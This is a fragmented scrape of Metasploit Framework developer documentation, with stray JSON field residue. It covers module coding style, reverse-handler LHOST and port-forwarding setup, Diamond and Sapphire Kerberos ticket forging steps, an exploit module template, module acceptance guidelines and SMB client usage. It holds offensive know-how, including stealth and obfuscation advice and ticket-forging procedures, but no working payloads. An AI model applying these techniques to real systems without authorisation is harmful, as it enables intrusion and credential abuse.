tasty, let's call them... tastycles!\" food = str.scan(/donut holes/)[0] # food is nil, and nil has no method called \"empty\". # This will throw an error: \"undefined method `empty?' for nil:NilClass\" if food.empty? or food.nil? puts \"I don't know what it's called\" end . 5. Using exception handling to shut an error up . begin # This block has 2 issues: # Issue #1: sample() is not a method in 1.8.7 # Issue #2: Divided by 0 (race condition) n = [0, 1, 2, 3, 4, 5].sample 1/n rescue # If the user reports a bug saying this code isn't # working, it can be hard to debug exactly what went # wrong for the user without a backtrace. # When you do this, the error also won't be logged in # framework.log, either. # Note that rescuing ::Exception is especially harmful # because it can even hide syntax errors. end . 6. Not taking advantage of the ‘ensure’ block . # You should use the ensure block to make sure x always has a value, # which also avoids repeating code begin n = [0, 1, 2].sample x = 1/n rescue ZeroDivisionError =&gt; e puts \"Are you smarter than a 5th grader? #{e.message}\" x = 0 # Can put this in the ensure block rescue NoMethodError puts \"You must be using an older Ruby\" x = 0 # Can put this in the ensure block end puts \"Value is #{x.to_s}\" . 7. Adding the ‘VERBOSE’ option . register_options( [ # You already have this. Just type 'show advanced' and you'll see it. # So no need to register again OptBool.new(\"VERBOSE\", [false, 'Enable detailed status messages', false]) ], self.class) . 8.

This is the real heart of the matter here. We call scan! on our scanner, and pass it a block. As we mentioned before, the scanner yields each attempt’s Result object into that block. We check the result’s status to see if it was successful or not. The result object now as a .to_h method which returns a hash compatible with our credential creation methods. We take that hash and merge in our module specific information and workspace id. In the case of a success we build some info hashes and call create_credential. This is a method found in the metasploit-credential gem under lib/metasploit/credential/creation.rb in a mixin called Metasploit::Credential::Creation. This mixin is included in the Report mixin, so if your module includes that mixin you’ll get these methods for free. create_credential creates a Metasploit::Credential::Core. We then take that core, the service data, and merge it with some additional data. This additional data includes the access level, the current time (to update last_attempted_at on the Metasploit::Credential::Login), the status. Finally, for a success, we output the result to the console. In the case of a failure, we call the invalidate_login method. This method also comes from the Creation mixin. This method looks to see if a Login object already exists for this credential:service pair. If it does, it updates the status to the status we got back from the scanner. This is primarily to account for Login objects created by things like Post modules that have an untried status. ",

Specifying the -a parameter will ask RuboCop to check your module and if possible fix any issues that RuboCop is able to fix.

It is encouraged to keep running this command and fixing any issues that come up until RuboCop no longer comes back with any errors to report. Once this is complete, run git add &lt;file&gt; followed by git commit -m \"RuboCop Fixes\". You can change the commit message if you want, but it should mention RuboCop as it helps maintainers know what the commit is related to. As a good practice rule, you should always separate your commits that contain RuboCop changes from those that contain non-RuboCop related changes. This helps ensure that when it comes time to review your code, review can proceed a lot quicker and more efficiently. Note that special cases exist if you are writing library code as our RuboCop rules are primarily designed to be run against modules.

This doesn’t mean that this is where the handler actually exists. LHOST is a value that is meaning from the perspective of the target machine. This value is passed along as part of the configuration for stagers and stages and tells the target machine where to go to reach the handler, and so this has to map to a value that is reachable by the target. A handler obviously needs to listen on a host/IP for the incoming connection. In cases where the LHOST value, for example the address that the target is able to reach, is the same as that which the host can listen on, no extra work has to be done. The LHOST value is used by the handler. However, if some kind of NAT or port forward is enabled, or if the handler is behind a firewall, then setting LHOST isn’t enough. In order to listen on the appropriate interface, another setting must be used called ReverseListenerBindAddress. This value tells the handler to listen on a different interface/IP, but it doesn’t change the fact that the LHOST value is given to the target when the stage is uploaded. In short, LHOST must always remain the IP/host that is routable from the target, and if this value is not the same as what the listener needs to bind to, then change the ReverseListenerBindAddress value. If you’re attacking something across the Internet and you specify an internal IP in LHOST, you’re doing it wrong. ",

If you have port forwarding in place, and your listener needs to bind to a different port, then you need to make use of the ReverseListenerBindPort setting. The classic example of this case is where an attacker wants to make use of port 443, but rightfully doesn’t want to run Metasploit as root just so they can directly bind to ports lower than 1024. Instead, the set up a port forward (on their router, or using iptables) so that 443 forwards to 8443, with a goal of accepting connections on that port instead. To accommodate this scenario, the LHOST value must still contain 443, as this is the port that the target machine needs to establish communications on; 443 is the value that needs to go out with the stager and the stage configurations. Metasploit needs to bind locally to port 8443, and so the handler is configured so that ReverseListenerBindPort has this value instead. When the handler launches, it binds to 8443 and handles any connections it receives. When a stage is generated, it uses 443 from LHOST value to populate the configuration. If the attacker makes the mistake of either setting LPORT to 8443, or leaving LPORT as 443 and not using ReverseListenerBindPort, then the result is either a dead shell after the first stage, or no connect back at all.

Quick things to check . | Make sure that LHOST is set to a routable address from the target, and not a local listen address. | Make sure that LPORT is set to the port number that the target needs to connect to. | Make sure that ReverseListenerBindPort is set if port forwarding is enabled and the traffic is being routed to a different port. | Make sure that your listener’s configuration matches that of the target from an architecture perspective. If you mix x64 listeners with x86 payloads (and vice versa), things will go bad. | . Not so quick things to check . | If the target is running AntiVirus there’s a chance that the stage , for example metsrv, is being caught while being uploaded. reverse_tcp and reverse_http stagers download metsrv without any encryption, and so the content of the DLL is visible to anything watching on the wire. reverse_https can still get caught in cases where AV is doing MITM content inspection.

A diamond ticket is just a golden ticket (thus requiring knowledge of the krbtgt hash), with an attempt to be stealthier, by: . | Performing an AS-REQ request to retrieve a TGT for any user | Using the krbtgt hash to decrypt the real ticket | Setting properties of the forged PAC to mirror those in the valid TGT | Encrypting the forged ticket with the krbtgt hash | . The primary requirement of a Diamond ticket is the same: knowledge of the krbtgt hash of the domain. The DOMAIN_SID property is not required, as this is retrieved from the valid TGT. To perform the first step (retrieving the TGT), you must provide sufficient information to authenticate to the domain (i.e. RHOST, USERNAME and PASSWORD). Forging Sapphire ticket . A sapphire ticket is similar to a Diamond ticket, in that it retrieves a real TGT, and copies data from that PAC onto the forged ticket. However, instead of using the ticket retrieved in the initial authentication, an additional step is performed to retrieve a PAC for another (presumably high-privilege) user: . | Authenticating to the KDC | Using the S4U2Self and U2U extensions to request a TGS for a high-privilege user (this mirrors what the real user’s PAC would look like, but the ticket is unusable in high-privilege contexts) | Decrypt this information | Setting properties of the forged PAC to mirror those in the valid TGT | Encrypting the forged ticket with the krbtgt hash | . The primary requirement of a Sapphire ticket is the same as for Golden and Diamond tickets: knowledge of the krbtgt hash of the domain. The DOMAIN_SID and DOMAIN_RID properties are not required, as this is retrieved from the valid TGT.

Invalid SPN . SPNs must be in the format */*. If this is not identical to what Active Directory is configured with, it will not work. Verbose Mode . If you set Verbose true you will set the module to run in a more verbose mode.

The real kung-fu behind exploit development isn’t actually about which language you choose to build it; it’s about your precise understanding of how input is processed by the application you’re debugging, and how to gain control by manipulating it. That’s right; the keyword is “debugging.” Your binjitsu (reverse-engineering) is where the real kung-fu is. However, if your goal isn’t just about popping a calculator, but actually want to weaponize, to maintain, and to provide use in the practical world, you need a development framework. And this is where Metasploit comes in. It’s a framework that’s free and open-source, actively contributed by researchers around the world. So when you write a Metasploit exploit, you don’t have to worry about any dependency issues, or having the wrong version, or not having enough payloads for different pentesting scenarios to choose from, etc. The idea is all you need to do is focus on building that exploit, and nothing more.

If not, then despite exploiting a vulnerability, for Metasploit’s purposes the module would fall into the auxiliary category. Unlike writing a proof-of-concept, when you write a Metasploit module, you need to think about how users might use it in the real world. Stealth is usually an important element to think about. Can your exploit achieve code execution without dropping a file? Can the input look more random, so it’s more difficult to detect? How about obfuscation? Is it generating unnecessary traffic? Can it be more stable without crashing the system? . Try to be precise about exploitable requirements. Usually, a bug is specific to a range of versions or even builds. If you can’t automatically check that, you need to at least mention it in the description somewhere. Some of your exploit’s techniques might also be application-specific. For example, you can take advantage of a specific behavior in the application to generate heap allocations the way you want, but maybe it’s noisier in the newer version, so that gives you some stability issues. Does it need a 3rd-party component to work that may not even be installed by everyone? Even if it is, is the component revised often enough that it could make your exploit less reliable? . Know that in the real world, your exploit can break or fail in a lot of different ways. You should try to find out and fix it during the development and testing phase before learning the hard way. ",

    "content": "As you can see, reliability is important to Metasploit, and we try to be more friendly about this for the users. I know what you’re thinking: “Well, if they’re using the exploit, they should understand how it works, so they know what they’re getting themselves into.” In the perfect world, yes. Knowing how a vulnerability works or how an exploit works will only benefit the user, but you see, we don’t live in the perfect world. If you’re in the middle of a penetration test, it’s very unlikely to always find the time to recreate the vulnerable environment, strip the exploit to the most basic form to debug what’s going on, and then do testing. Chances are you have a tight schedule to break into a large network, so you need to use your time carefully. Because of this, it’s important to at least have a good description and good references for the module. And of course, a ranking system that can be trusted. The Metasploit Framework has seven different rankings to indicate how reliable an exploit is. See Exploit Ranking for more details. ",

    "content": "If you have read this far, we think you are pretty impressive because it’s a lot to digest. You are probably wondering why we haven’t had a single line of code to share in the writeup. Well, as you recall, exploit development is mostly about your reversing skills. If you have all that, we shouldn’t be telling you how to write an exploit. What we’ve done so far is hopefully get your mindset dialed-in correctly about what it means to become a Metasploit exploit developer for the security community; the rest is more about how to use our mixins to build that exploit. Well, there are A LOT of mixins, so it’s impossible to go over all of them in a single page, so you must either read the API documentation, existing code examples, or look for more wiki pages we’ve written to cover specific mixins. For example, if you’re looking for a writeup about how to interact with an HTTP server, you might be interested in: How to send an HTTP Request Using HTTPClient. If you’re interested in browser exploit writing, definitely check out: How to write a browser exploit using BrowserExploitServer, etc. But of course, to begin, you most likely need a template to work with, and here it is. We’ll also explain how to fill out the required fields: . ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking def initialize(info = {}) super( update_info( info, 'Name' =&gt; '[Vendor] [Software] [Root Cause] [Vulnerability type]', 'Description' =&gt; %q{ Say something that the user might need to know }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'Name' ], 'References' =&gt; [ [ 'URL', '' ] ], 'Platform' =&gt; 'win', 'Targets' =&gt; [ [ 'System or software version', { 'Ret' =&gt; 0x41414141 # This will be available in `target.ret` } ] ], 'Payload' =&gt; { 'BadChars' =&gt; \"\\x00\" }, 'Privileged' =&gt; false, 'DisclosureDate' =&gt; '', 'DefaultTarget' =&gt; 0, 'Notes' =&gt; { 'Stability' =&gt; [CRASH_SAFE], 'Reliability' =&gt; [REPEATABLE_SESSION], 'SideEffects' =&gt; [ARTIFACTS_ON_DISK, IOC_IN_LOGS] }, ) ) end def check # For the check command end def exploit # Main function end end . | Name - The Name field should begin with the name of the vendor, followed by the software. Ideally, the “Root Cause” field means which component or function the bug is found. And finally, the type of vulnerability the module is exploiting. | Description - The Description field should explain what the module does, things to watch out for, specific requirements, the more, the better. The goal is to let the user understand what he’s using without the need to actually read the module’s source and figure things out. And trust me, most of them don’t. | Author field is where you put your name. The format should be “Name “. If you want to have your Twitter handle there, leave it as a comment, for example: “Name # handle” . | References - The References field is an array of references related to the vulnerability or the exploit. For example, an advisory, a blog post, etc. Make sure you use known reference identifiers – see Module reference identifiers for a list. | Platform - The Platform field indicates what platforms are supported, for example: win, linux, osx, unix, bsd. | Targets - The Targets field is an array of systems, applications, setups, or specific versions your exploit is targeting. The second element or each target array is where you store specific metadata about that target, for example, a specific offset, a gadget, a ret address, etc. When a target is selected by the user, the metadata is loaded and tracked by a “target index”, and can be retrieved by using the target method. | Payloads - The Payloads field specifies how the payload should be encoded and generated. You can specify: Space, SaveRegisters, Prepend, PrependEncoder, BadChars, Append, AppendEncoder, MaxNops, MinNops, Encoder, Nop, EncoderType, EncoderOptions, ExtendedOptions, EncoderDontFallThrough. | DisclosureDate - The DisclosureDate is about when the vulnerability was disclosed in public, in the format of: “M D Y”. For example: “Apr 04 2014” . | Notes - The Notes field is a hash always containing three keys. The value of each key is an array of constants. The list of available constants can be found in the Definition of Module Reliability Side Effects and Stability. The key should be present even if the array is empty. | Stability - The Stability field describes how the exploit affects the system it’s being run on, ex: CRASH_SAFE, CRASH_OS_DOWN | Reliability - The Reliability field describes how reliable the session is that gets returned by the exploit, ex: REPEATABLE_SESSION, UNRELIABLE_SESSION | SideEffects - The SideEffects field describes the side effects caused by the exploit that the user should be aware of, ex: ARTIFACTS_ON_DISK, IOC_IN_LOGS, ACCOUNT_LOCKOUTS. | . | . Non-required fields . | Stance - The types of stances an exploit can take, such as passive or aggressive. Stances indicate whether or not the module triggers the exploit without waiting for one or more conditions to be met (aggressive) or whether it must wait for certain conditions to be satisfied before the exploit can be initiated (passive). Passive exploits usually would wait for interaction from a client or other entity for being able to trigger the vulnerability. | Passive - Either true or false indicates whether or not the exploit should be run as a background job. If for example you know the vulnerability takes an hour to trigger, setting Passive to true would be beneficial as it allows the user to continue using msfconsole while waiting for a response from the exploit. | . Your exploit should also have a check method to support the check command, but this is optional in case it’s not possible. And finally, the exploit method is like your main method. Start writing your code there. An example exploit module is also available: example.rb . ",

    "title": "Basic git commands",
    "content": "Metasploit no longer uses svn for source code management. Instead, we use git, so knowing some tricks with git go a long way. We’re not here to lecture you about how awesome git is; we know it has a learning curve, and it’s not surprising to find new users making mistakes. Every once a while, your git “rage” will kick in, and we understand. However, it’s important for you to take advantage of branching. Every time you make a module or make some changes to existing code, you should not do so on the default master branch. Why? Because when you do a msfupdate, which is Metasploit’s utility for updating your repository, it will do a git reset before merging the changes, and all your code goes away. Another mistake people tend to do is have all the changes on master before submitting a pull request. This is a bad idea because most likely; you’re submitting other crap you don’t intend to change, or you’re probably asking us to merge other unnecessary commit histories when there only needs to be one commit. Thanks for contributing your module to the community, but no thanks to your crazy commit history. So as a habit, when you want to make something new, or change something, begin with a new branch that’s up to date to master. First off, make sure you’re on master. If you do a git status it will tell you what branch you’re currently on: . $ git status # On branch upstream-master nothing to commit, working directory clean . Ok, now do a git pull to download the latest changes from Metasploit: . $ git pull Already up-to-date. At this point, you’re ready to start a new branch. In this case, we’ll name our new branch “my_awesome_branch”: . $ git checkout -b my_awesome_branch Switched to a new branch 'my_awesome_branch' . And then you can go ahead and add that module. Make sure it’s in the appropriate path: . $ git add [module path] . When you decide to save the changes, commit (if there’s only one module, you can do git commit -a too so you don’t have to type the module path. Note -a really means EVERYTHING): . $ git commit [module path] . When you’re done, push your changes, which will upload your code to your remote branch “my_awesome_branch”. You must push your changes in order to submit the pull request or share it with others on the Internet. $ git push origin my_awesome_branch . ",

The story of Metasploit Framework’s creation and development over the last 13 years is one of community collaboration to create and hone tools useful to a wide range of security practitioners. Its broad functionality, combined with the deep domain knowledge of the mentors, offers a unique opportunity for students to learn about security and exploit development. Many of our contributors are established exploit developers and penetration testers who have years of industry experience that they can share with students. We hope that the experience will inspire students to continue contributing to open source security, as well as providing them with invaluable real-world training in development, security, and remote collaboration. How will you keep mentors engaged with their students? . All of our mentors are long-time development team members who have a history of helping new users and contributors. Many of our mentors specialize in certain parts of the framework, so depending on the student’s interests, we will match them with the most complementary mentor. Our project administrators will regularly check in with mentors and students to ensure that the relationship is productive and progressing as expected. How will you help your students stay on schedule to complete their projects? . First, we will ask students to use GitHub’s Projects to track progress in real time as they are working. Mentors will help students divide projects into manageable chunks with measurable milestones. This will help students learn how to manage and break up tasks on large scale projects. Additionally, students and mentors will need to collaborate on a weekly status report that describes their progress and send it to the mailing list. How will you get your students involved in your community during GSoC? . Students will use the same channels that all our contributors use: IRC and GitHub. Students will follow the same procedures of code review that all our contributors follow. By providing them with the same communication channels that our community uses, we hope to encourage the students to interact and collaborate with other contributors and users and to explore additional resources beyond their mentor. Hopefully, this process will give them a network of support and illustrate the advantages of working with other minds. How will you keep students involved with your community after GSoC? . Based on the success of the project, we will encourage students to apply for committer rights at the conclusion of GSoC, include them in Metasploit roadmap discussions, and invite them to special community events. After the conclusion of GSoC we will encourage students to write about their experience on Metasploit’s community blog, which will give their work greater exposure to the overall security community.

As it stands, the framework defines anything that takes a payload to be an exploit. Because post-exploitation modules cannot take a payload, things that want to drop an executable for persistence are implemented as local exploits (in the exploit/*/local namespace instead of post/*/persistence).

We’ll need several pieces for this to work: . | A new session interface in Msf::Sessions (lib/msf/base/sessions/). This should be abstract enough that we can implement protocols other than FTP in the future. | A mapping of protocol details to that interface. | A new command dispatcher implementing at least these commands: upload, download, ls, cd | We’ll need to modify auxiliary/scanner/ftp/ftp_login to create one of these awesome new sessions when authentication is successful. | .

The idea here is to create a transport that allows Meterpreter and Console to talk via File handles opened via UNC path. In cases where 445 is allowed outbound, Meterpreter can open file handles to a UNC path that MSF is listening on, and they can communicate on those file handles. For this to work we need: . | A new transport that knows how to operate over SMB file handles . | In particular, one file handle is used for writing, and one for reading. | . | New stagers that use the Win32 API to open file handles to a given UNC path. | Most of this is already done in a PR for named pipe transport support, and so a few changes to those stagers should result in it working fine for this. | . | To come up with a method/protocol that both Console and Meterpreter can use to identify when new sessions come in. | .

A previous contributor attempted to add this functionality for a limited set of RCP commands however review identified that the changes would introduce changes to the documented public API and also introduce inconsistency within the API responses resulting in a fluctuating public API.

When performing security assessment on a network with centralized login such as LDAP or Active Directory these services are sometimes exposed directly on the network. While Metasploit has capabilities to collect various pieces of information from these services when a user has been able to gain code execution inside a target system by utilizing tooling such as Sharphound or by leveraging SMB services via the secrets_dump module, these methods are somewhat indirect. A network base capability to query exposed services may have value. An interactive terminal plugin allowing users to connect directly to LDAP or Active Directory providing capabilities similar to the existing requests plugin could enable users search for valuable information in these services without the need to compromise a target or interact with a secondary service.

Size: Medium Difficulty: 3/5 . Improving post-exploit API to be more consistent, work smoothly across session types . The Metasploit post-exploitation API is intended to provide a unified interface between different Meterpreter, shell, PowerShell, mainframe, and other session types. However, there are areas where the implementation is not consistent, and could use improvements: . | Shell sessions do not implement the filesystem API that Meterpreter sessions have | When a shell session is in a different language, e.g. Windows in French, the post API does not find the expected output. Add localization support for these. | Simple commands like ‘cmd_exec’ are fast in Shell sessions but are relatively slow in Meterpreter sessions. Add an API to make Meterpreter run simple commands more easily. | . Size: Medium/Large (Depends on proposal) Difficulty: Varies . Improve the web vulnerability API . This would follow up on the Arachni plugin PR https://github.com/rapid7/metasploit-framework/pull/8618 and improve the Metasploit data model to better represent modern web vulnerabilities. This project would require knowledge of data models, types of modern web vulnerabilities, and experience with web app security scanners. Size: Large Difficulty: 4/5 . Data Visualization . Enhance existing Metasploit Goliath dashboard that allows observation of an active engagement. Data visualization would include, but not be limited to: host node graph with activity indicators and heat maps. The main idea here is to create a visualization tool that helps users understand data that has been gathered into Metasploit during usage in some useful way. Proposals should note where the service will live, how a user will use the service, and how you will provide a maintainable and extendable consumer for the data that is exposed. See Metasploit ‘Goliath’ Demo (msf-red) for a demo video of Goliath in action. You can also read more on Metasploit Goliath at Metasploit-Data-Service-Enhancements-(Goliath) .

    "doc": "Guidelines for Accepting Modules and Enhancements",
    "title": "Module Additions",
    "content": "Most open source community support for Metasploit comes in the form of Metasploit modules. The following should be considered for acceptance; note that these are guidelines and not categorical imperatives (“should”s, not “must”s), since there are always exceptions to the norm-especially when it comes to novel new attacks and techniques. Modules should pass msftidy.rb and adhere to the CONTRIBUTING.md guidelines. Both are distributed with Metasploit. See Style Tips for some information on how to take some of the headache out of whitespace issues. Modules should have a clear and obvious goal: Exploits should result in a shell. Post modules should result in privilege escalation or loot. Auxiliary modules are an “Everything else” category, but even they should be limited to a well-defined task (e.g., information gathering to enable an exploit or a post module). Modules should not launch other modules, given the complexity of setting multiple payloads. Such actions are usually automation tasks for an external UI. Denial of Service modules should be asymmetric and at least have some interesting feature. If it’s comparable to a synflood, it shouldn’t be included. If it’s comparable to Baliwicked, it should be included. Modules that hover the line, such as slowloris, may be included with some justification. Modules should be able to function as expected with minimal configuration. Defaults should be sensible and usually correct. Modules should not depend on exact timing, uncontrollable heap states, system DLLs, etc. All memory addresses (ie. a JMP ESP, or a ROP gadget) should be part of the metadata under ‘Targets’, and documented (what instructions it points to, and what DLL). If the exploit is against a specific hardware (e.g., routers, PLCs, etc), or against a software that’s not free (and no trial/demo available), please remember to submit a binary packet capture (pcap-formatted) along with the module that demonstrates the exploit actually works. Please don’t use the alphanum encoder as a way to avoid BadChar analysis. Modules which set the EncoderType field in the payload as a way to avoid doing real BadChar analysis will be rejected. These modules are nearly always unreliable in the real world. Exploit ranking definitions can be found on the Exploit Ranking page. Exploit modules should implement a check() function when this is trivial to do so. Versions exposed through banners or network protocols should always result in a check() routine when a patch is available that changes this version. If a module (auxiliary or post) obtains some sort of information from the victim machine, it should store that data using one (or more) of the following methods: . | store_loot(): Used to store both stolen files (both text and binary) and “screencaps” of commands such as a ps -ef and ifconfig. The file itself need not be of forensic-level integrity – they may be parsed by a post module to extract only the relevant information for a penetration tester. | report_auth_info(): Used to store working credentials that are immediately reusable by another module. For example, a module dumping the local SMB hashes would use this, as would a module which reads username:password combinations for a specific host and service. Specifically, merely “likely” usernames and passwords should use store_loot() instead. | report_vuln(): Auxiliary and post modules that exercise a particular vulnerability should report_vuln() upon success. Note that exploit modules automatically report_vuln() as part of opening a session (there is no need to call it especially). | report_note(): Modules should make an effort to avoid report_note() when one of the above methods would be a better fit, but there are often cases where “loot” or “cred” or “vuln” classifications are not immediately appropriate. report_note() calls should always set a OID-style dotted :type, such as domain.hosts, so other modules may easily find them in the database. | . Modules should take advantage of the normal Metasploit APIs. For example, they should not attempt to create their own TCP sockets or application protocols with native Ruby; they should mediate sockets through Rex and Rex::Proto methods instead. This ensures compatibility with the full set of Framework features, such as pivoting and proxy chaining. Web application attacks are generally uninteresting (SQLi, XSS, CSRF), unless the module can reliably result in a shell or exercise some kind of useful information leak. Even in that case, the module should “just work,” as above. Web application attacks should be limited only to popular, widely deployed applications. For example, a SQLi module against a popular CMS that results in a shell on the CMS machine would be welcome. A module that causes a private Facebook profile to become public would not (Facebook has exactly one deployed instance). Web application attacks should implement an HttpFingerprint constant. Modules should only list targets that you actually tested the exploit on. Avoid assuming it works on a specific system if it has never been tested on it. Comments above the target entry indicating additional information about a given target (language pack, patch level, etc) greatly assist other developers in creating additional targets and improving your module. Modules can exercise unpatched and undisclosed vulnerabilities. However, Rapid7 is happy to assist with the disclosure process by following the Rapid7 policy. This policy provides a fixed 90-day window from when the vendor is contacted until the exploit is released. All vulnerabilities found by Rapid7 staff follow this process. The submitter will receive full credit for the vulnerability and the resulting exploit module regardless of how disclosure is handled. ",

    "content": "Generally, new functionality to the Metasploit Framework should start life as a plugin. If the functionality becomes useful and popular, we can integrate it more closely, add RPC API exposure, and so on, but it should be well-tested by the community before then. Automating a series of discrete functions is generally /not/ the responsibility of the Framework. Automation should be accomplished through the API (see Metasploit Community/Pro, MSFGUI, etc). Past efforts with in-Framework automation prove this out. Components such as db_autopwn and browser_autopwn rarely did what users expected, and configuring these tools became a nightmare through increasingly complex sets of options and arguments. Automating the Framework is easy and should stay easy, but the automation itself should live in resource scripts and other external front-ends to the Framework itself. Console functionality should have a focus on exploit and security tool development, with the exploit developer as the typical user. End users should be pointed to an interface such as the Community Edition or MSFGUI and should not expect much in terms of user-friendliness from the console. The console should be considered a debug mode for Metasploit and as close to bare-metal functionality as possible. External tools, such msfpayload and msfvenom, are designed to make exploit development easier and exercise specific techniques. We are happy to continue evaluating tools of this nature for inclusion in the Framework; these should be accompanied by documentation (!), how-to tutorials for quick start, and other helpful text. ",

    "title": "SMB Protocol Overview",
    "content": "SMB (Server Message Block) is a network communication protocol that provides file sharing, network browsing, printing services, and interprocess communication over a network. It relies on lower level protocol transports: . | NetBIOS . | over TCP/IP (NBT) on 137/UDP, 138/UDP, 137/TCP and 139/TCP | over NetBEUI | . | Directly over TCP on 445/TCP (by far the most commonly used) | . CIFS is a particular implementation of SMB created by Microsoft based on the original IBM specifications. It has been replaced by SMB v1.0, which is a Microsoft Extensions to MS-CIFS. SMB2 is a complete rewrite of the protocol which primarily aims to reduce the amount of messages exchanged between the client and the server. SMB v2.0 has been introduced in Windows Vista/Server 2008. It also brings some new features such as: . | Pipelining | Symbolic links | Large file transfers improvement | Better signing | New opportunistic locking mechanism | . SMB v2.1 was added to Windows 7/Server 2008 R2 with a few improvements: . | Minor performance enhancements | New opportunistic locking mechanism | . SMB3 adds some interesting features and has been introduced in Windows 8/Server 2012. Here are some new capabilities added by the SMB v3.0 dialect: . | SMB Direct (SMB over remote direct memory access - RDMA) | SMB Multichannel (multiple connections per SMB session) | SMB Transparent Failover (useful for clustered file server) | Per-share encryption (AES-128 CCM) and AES-based signing | . SMB v3.0.2 (from Windows 8.1/Server 2012 R2) only adds some small improvements. Finally, SMB v3.1.1 (from Windows 10/Server 2016) introduces the following features: . | Negotiation of encryption and integrity algorithms | AES-128 GCM encryption | Pre-authentication integrity check (SHA-512) | Compression | .

    "content": ". | NetBIOS session establishment This step is only required if NetBIOS over TCP (NBT) transport is used. This is not very common anymore, since SMB over TCP (from windows 2000) removed the NetBIOS transport layer. In case a NetBIOS session needs to be established, this must be the first packet exchange. | Negotiation This is where the SMB protocol version and dialect are going to be negotiated between the client and the server. From SMB v3.1.1, encryption/compression capabilities are also negotiated at the same time. | Authentication Depending on the authentication scheme, this step requires one or two packet exchanges. NTLM challenge-response, the only authentication protocol supported by RubySMB at time of writing, consists of sending first a Session Setup packet containing the client capabilities. The server responds with a challenge. Then, another Session Setup request is sent with the challenge response. If it is accepted, the server returns a Session ID that will be used in subsequent requests. This defines the beginning of an SMB Session. | . Fig.1 - Negotiation &amp; authentication packet exchanges . | Connect to a share Once the SMB session is established, the SMB client must connect to a remote share.This is done by sending a TreeConnect request and getting a Tree ID. This identifier will be used by subsequent file operations on this share. | File operation From there, the client can execute any file operation on the remote share, such as open, read, write, delete, rename, etc. When the client is done with a file, it can simply close the handle. The Tree ID remains valid and can be reused. | . Fig.2 - Connect to share &amp; read file packet exchanges . | Close tree and session The client can decide to release the connection to the share at any time by sending a TreeDisconnect request. Note that the SMB session will remain active until the client sends a Logoff packet, which defines the end of the SMB Session. | . ",

    "content": "Using the default MSF client . The following mixin will bring everything you need, including the main MSF SMB Client. include Msf::Exploit::Remote::SMB::Client::Authenticated . Following the same workflow described above: . | Initialization | . The first step is to initialize the client by invoking connect. The version(s) that will be negotiated can also be set up by passing an array to the keyword arguments versions. For example, to negotiate any dialect of SMB version 2 and 3, use this: . connect(versions: [2, 3]) . The default is to negotiate versions 1, 2 and 3. Note that the client will just let the SMB server know which versions and dialects it supports. The server will always choose the latest version it supports. This means, Windows 7 will always choose SMB v2.1 (SMB3 has been added to Windows 8 only), even if versions 1, 2 and 3 are advertised by the client. If SMB2 is disabled on this host for whatever reason, the SMB server will fall back to SMB1. By choosing which versions the client must negotiate, you can force the server to use a specific protocol version, assuming it is supported and enabled. From Metasploit 6, the MSF client uses RubySMB under the hood by default for any SMB protocol version. For compatibility with older modules, it is still possible to force the client to use the original Rex SMB implementation. Note that this is not recommended and RubySMB should be the default for new modules. This can be done by explicitly negotiate SMB1 only (Rex only supports this version): . connect(versions: [1]) . | NetBIOS session, negotiation and authentication | . The actual negotiation and authentication are handled by smb_login. This retrieves the NetBIOS name, user name, password and domain from the SMBName, SMBUser, SMBPass and SMBDomain options set by the operator, respectively. Other options can be set and are defined in MSF SMB client. Under the hood, smb_login establishes the NetBIOS session (if needed), negotiates the protocol version/dialect and sets the SMB Session up using NTLM challenge-response authentication protocol. If, for whatever reason, the authentication options cannot be retrieved from the user options, it is still possible to provide them manually by calling simple.login() directly (see SimpleClient#login) . simple.login(name, user, pass) . Note that simple is the Rex::Proto::SMB::SimpleClient object and is accessible anywhere in the module. This is the main interface to interact with RubySMB (more on that later). | Connect to a share | . This is done by invoking simple.connect: . simple.connect(\"\\\\\\\\&lt;host&gt;\\\\&lt;share&gt;\") . | File operations | . | read a file file_path = 'file/path/relative/to/the/share/root' file = smb_open(file_path, 'o') print_status(\"File content: #{file.read}\") file.close . See SimpleClient#open and RubySMB::Dispositions for details about the smb_open mode argument. | write to a file file = smb_open(file_path, 'co', write: true) file &lt;&lt; \"my file data\" file.close . | delete a file simple.delete(file_path) . | . | Close the connection to the remote share | . simple.disconnect(\"\\\\\\\\&lt;host&gt;\\\\&lt;share&gt;\") . Since Metasploit 6, two new options were introduced to control version negotiation and encryption. These options are only available when using the default MSF SMB client and are automatically pulled in with Msf::Exploit::Remote::SMB::Client or Msf::Exploit::Remote::SMB::Client::Authenticated mixins: . | SMB::ProtocolVersion: one or a list of comma-separated SMB protocol versions to negotiate (e.g. “1” or “1,2” or “2,3,1”). | SMB::AlwaysEncrypt: enforces encryption even if the server does not require it (SMB3.x only). When it is set to false, the SMB client will still encrypt the communication if the server requires it. | . Using RubySMB client directly . This mixin is not required but can be useful to expose the SMB related options to the operator: . include Msf::Exploit::Remote::SMB::Client::Authenticated . An alternative is to register the options we need in initialize: . register_options([ OptString.new('SMBUser', [ false, 'The username to authenticate as', '']), OptString.new('SMBPass', [ false, 'The password for the specified username', '']), OptString.new('SMBDomain', [ false, 'The Windows domain to use for authentication', '.']), ]) . Following the same workflow described above: . | Initialization | . | setup the dispatcher dispatcher = RubySMB::Dispatcher::Socket.new(sock) . | initialize the client SMB versions 1, 2 and 3 will be negotiated by default. Use smb1, smb2 and smb3 keyword arguments to disable a version (false value). See RubySMB::Client#initialize for more initialization options client = RubySMB::Client.new(dispatcher, username: datastore['SMBUser'], password: datastore['SMBPass'], domain: datastore['SMBDomain']) . | . | Negotiation | . client.negotiate . | Authentication | . client.authenticate . | Connect to a share | . tree = client.tree_connect(\\\\\\\\&lt;host&gt;\\\\&lt;share&gt;) . | File operations | . file_path = 'file/path/relative/to/the/share/root' . | read a file (see RubySMB::SMB1::Tree and RubySMB::SMB2::Tree for details) file = tree.open_file(filename: file_path) data = file.read file.close . | write to a file file = tree.open_file(filename: file_path, write: true, disposition: RubySMB::Dispositions::FILE_OPEN_IF) file.write(data: 'my data') file.close . | delete a file file = tree.open_file(filename: file_path, delete: true) file.delete file.close . | . | Close the connection to the remote share | . tree.disconnect! . | Close the SMB session | . client.disconnect! .

